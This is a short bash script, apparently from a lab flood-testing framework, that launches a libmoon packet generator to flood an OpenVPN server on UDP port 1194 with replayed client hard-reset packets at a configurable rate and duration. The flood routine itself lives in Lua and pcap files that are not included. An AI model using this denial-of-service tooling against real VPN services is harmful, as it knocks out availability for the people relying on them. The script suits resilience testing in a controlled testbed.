#!/bin/bash

# sudo script.sh <ipSrc> <ipDst> <attackRate> <duration>
# e.g.
# sudo bash ovpnFlood.sh 172.31.116.132 172.31.116.137 1000 10

# cd to directory of script
scriptDir=$(dirname -- "$(readlink -f -- "$BASH_SOURCE")")
cd "$scriptDir"

# prepare Flood Generator framework
source ../prepFloodGenerator.sh

############## Flood Configuration ##############

ipSrc=$1
ipDst=$2
attackRate=$3
seconds=$4

flows=${7:-1} #default value 1

# more fixed configuration values (adjust if needed)
ethSrc="3c:fd:fe:9e:8e:39"
udpSrc=1194

ethDst="b0:aa:77:2f:ab:1a"
udpDst=1194


############## Flood Start ##############

$libmoonBuild/libmoon ovpnFlood.lua \
    --seconds $seconds --threads 20 --rate $attackRate \
    --pchrcv2Pcap p_control_hard_reset_client_v2.pcap \
    --flows $flows \
    --ethSrc $ethSrc --ip4Src $ipSrc --udpSrc $udpSrc \
    --ethDst $ethDst --ip4Dst $ipDst --udpDst $udpDst \
    --startConfirmation \
    --outputDevStats stats.txt \
    0